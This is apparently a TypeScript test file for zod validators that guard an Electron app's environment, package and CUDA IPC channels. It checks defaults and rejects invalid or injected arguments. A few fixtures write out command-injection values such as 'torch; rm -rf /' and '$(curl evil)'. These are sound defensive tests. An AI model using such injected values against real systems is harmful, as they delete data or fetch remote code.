/**
 * env-validate.test.ts — node:test for the env IPC zod seam (file 04 §1,§3).
 *
 * env-ipc.ts is RELAY-ONLY and imports electron (so it is not unit-tested at the
 * seam, exactly like security-ipc.ts). The testable invariant is the validation
 * seam: every `env:* / pkg:* / cuda:*` channel arg flows through these zod
 * validators BEFORE routing (a renderer is the least-trusted surface, C5, and
 * these channels drive REAL pip/conda/nemesis ops — every fetch is RCE). This
 * file pins:
 *
 *   1. valid args parse to the coerced typed value (with defaults applied),
 *   2. invalid args reject with a SERIALIZABLE {kind:"invalid-args",message,…},
 *   3. shell-metacharacter / control-char injection in a name/spec/path is
 *      REJECTED at the seam (defence-in-depth over engine-bridge's shell:false),
 *   4. an EMPTY spec list is rejected (a fetch must name what it fetches).
 *
 * env-validate.ts imports the REAL `zod`; the decoupled runner maps it to the same
 * faithful double security-validate.test.ts uses (via zod-resolver.mjs registered
 * BEFORE the dynamic import). Production resolves the real zod via electron-vite.
 *
 * Run: node --import ../../../apps/cli/dev-register.mjs --test env-validate.test.ts
 */

import assert from "node:assert/strict";
import { register } from "node:module";
import { test } from "node:test";

// Map `zod` to the local double BEFORE importing env-validate.ts.
register(new URL("./__test-doubles__/zod-resolver.mjs", import.meta.url));

const {
  validateEnvCreate,
  validateEnvClone,
  validateEnvDelete,
  validateEnvUse,
  validateEnvImport,
  validatePkgList,
  validatePkgInstall,
  validatePkgUpgrade,
  validatePkgRemove,
  validatePkgToggle,
  validateCudaTorch,
  validateCudaInstall,
} = await import("./env-validate.js");

/** The shared discriminated outcome the validators return. */
type GuardResult<T> =
  | { ok: true; value: T }
  | { ok: false; error: { kind: string; message: string; detail?: string } };

/** Assert a result rejected with a serializable invalid-args error. */
function assertInvalidArgs(r: GuardResult<unknown>): void {
  assert.equal(r.ok, false);
  if (!r.ok) {
    assert.equal(r.error.kind, "invalid-args");
    assert.equal(typeof r.error.message, "string");
    assert.ok(r.error.message.length > 0);
    // must structured-clone (plain data, no Error prototype crossing IPC).
    assert.deepEqual(JSON.parse(JSON.stringify(r.error)), r.error);
  }
}

/* ── env:create ─────────────────────────────────────────────────────────────*/

test("validateEnvCreate accepts a name and defaults kind=venv, location=project", () => {
  const r = validateEnvCreate({ name: "llm-serving" });
  assert.equal(r.ok, true);
  if (r.ok) {
    assert.equal(r.value.name, "llm-serving");
    assert.equal(r.value.kind, "venv");
    assert.equal(r.value.location, "project");
    assert.equal(r.value.confirm, false);
  }
});

test("validateEnvCreate threads kind/python/location/confirm", () => {
  const r = validateEnvCreate({
    name: "ds",
    kind: "conda",
    python: "3.11",
    location: "global",
    confirm: true,
  });
  assert.equal(r.ok, true);
  if (r.ok) {
    assert.equal(r.value.kind, "conda");
    assert.equal(r.value.python, "3.11");
    assert.equal(r.value.location, "global");
    assert.equal(r.value.confirm, true);
  }
});

test("validateEnvCreate REJECTS a name with a path separator or shell metachar", () => {
  assertInvalidArgs(validateEnvCreate({ name: "a/b" }));
  assertInvalidArgs(validateEnvCreate({ name: "x;rm -rf" }));
  assertInvalidArgs(validateEnvCreate({ name: "" }));
  assertInvalidArgs(validateEnvCreate({}));
});

test("validateEnvCreate REJECTS an unknown kind enum", () => {
  assertInvalidArgs(validateEnvCreate({ name: "ok", kind: "pyenv" }));
});

/* ── env:clone / delete / use ────────────────────────────────────────────────*/

test("validateEnvClone requires from + to and defaults confirm/force false", () => {
  const r = validateEnvClone({ from: "env_abc", to: "clone-1" });
  assert.equal(r.ok, true);
  if (r.ok)
    assert.deepEqual(r.value, { from: "env_abc", to: "clone-1", confirm: false, force: false });
  assertInvalidArgs(validateEnvClone({ from: "env_abc" }));
});

test("validateEnvDelete requires an id", () => {
  assert.equal(validateEnvDelete({ id: "env_abc", confirm: true }).ok, true);
  assertInvalidArgs(validateEnvDelete({}));
});

test("validateEnvUse requires an id", () => {
  assert.equal(validateEnvUse({ id: "env_abc" }).ok, true);
  assertInvalidArgs(validateEnvUse({ id: "" }));
});

/* ── env:import ──────────────────────────────────────────────────────────────*/

test("validateEnvImport requires a file + name", () => {
  const r = validateEnvImport({ file: "/p/requirements.txt", name: "imported" });
  assert.equal(r.ok, true);
  if (r.ok) {
    assert.equal(r.value.file, "/p/requirements.txt");
    assert.equal(r.value.name, "imported");
    assert.equal(r.value.confirm, false);
  }
  assertInvalidArgs(validateEnvImport({ name: "x" }));
});

/* ── pkg:list / install / upgrade / remove / toggle ──────────────────────────*/

test("validatePkgList requires an env ref", () => {
  assert.equal(validatePkgList({ envId: "env_abc" }).ok, true);
  assertInvalidArgs(validatePkgList({}));
});

test("validatePkgInstall accepts a spec list + defaults confirm/force false", () => {
  const r = validatePkgInstall({ envId: "env_abc", spec: ["transformers>=4.40", "torch"] });
  assert.equal(r.ok, true);
  if (r.ok) {
    assert.deepEqual(r.value.spec, ["transformers>=4.40", "torch"]);
    assert.equal(r.value.confirm, false);
    assert.equal(r.value.force, false);
  }
});

test("validatePkgInstall threads scope/confirm/force/runId", () => {
  const r = validatePkgInstall({
    envId: "env_abc",
    spec: ["numpy"],
    scope: "global",
    confirm: true,
    force: true,
    runId: "run-1",
  });
  assert.equal(r.ok, true);
  if (r.ok) {
    assert.equal(r.value.scope, "global");
    assert.equal(r.value.confirm, true);
    assert.equal(r.value.force, true);
    assert.equal(r.value.runId, "run-1");
  }
});

test("validatePkgInstall REJECTS an empty spec list (a fetch must name what it fetches)", () => {
  assertInvalidArgs(validatePkgInstall({ envId: "env_abc", spec: [] }));
  assertInvalidArgs(validatePkgInstall({ envId: "env_abc" }));
});

test("validatePkgInstall REJECTS a spec carrying shell metacharacters", () => {
  assertInvalidArgs(validatePkgInstall({ envId: "env_abc", spec: ["torch; rm -rf /"] }));
  assertInvalidArgs(validatePkgInstall({ envId: "env_abc", spec: ["$(curl evil)"] }));
});

test("validatePkgUpgrade allows an OMITTED spec (sidecar resolves outdated)", () => {
  const r = validatePkgUpgrade({ envId: "env_abc" });
  assert.equal(r.ok, true);
  if (r.ok) {
    assert.equal(r.value.spec, undefined);
    assert.equal(r.value.confirm, false);
  }
});

test("validatePkgRemove requires one-or-more package names", () => {
  assert.equal(validatePkgRemove({ envId: "env_abc", pkgs: ["torch"] }).ok, true);
  assertInvalidArgs(validatePkgRemove({ envId: "env_abc", pkgs: [] }));
});

test("validatePkgToggle requires a single package name", () => {
  assert.equal(validatePkgToggle({ envId: "env_abc", pkg: "bitsandbytes" }).ok, true);
  assertInvalidArgs(validatePkgToggle({ envId: "env_abc" }));
});

/* ── cuda:torch / install ────────────────────────────────────────────────────*/

test("validateCudaTorch requires an env ref; index must be an http(s) url", () => {
  const r = validateCudaTorch({ envId: "env_abc", confirm: true });
  assert.equal(r.ok, true);
  if (r.ok) assert.equal(r.value.confirm, true);
  assert.equal(
    validateCudaTorch({
      envId: "env_abc",
      index: "https://download.pytorch.org/whl/cu121",
    }).ok,
    true,
  );
  assertInvalidArgs(validateCudaTorch({ envId: "env_abc", index: "ftp://evil/x" }));
  assertInvalidArgs(validateCudaTorch({}));
});

test("validateCudaInstall accepts an optional toolkit version + defaults", () => {
  const r = validateCudaInstall({ toolkit: "12.1" });
  assert.equal(r.ok, true);
  if (r.ok) {
    assert.equal(r.value.toolkit, "12.1");
    assert.equal(r.value.confirm, false);
    assert.equal(r.value.force, false);
  }
  assertInvalidArgs(validateCudaInstall({ toolkit: "twelve" }));
});
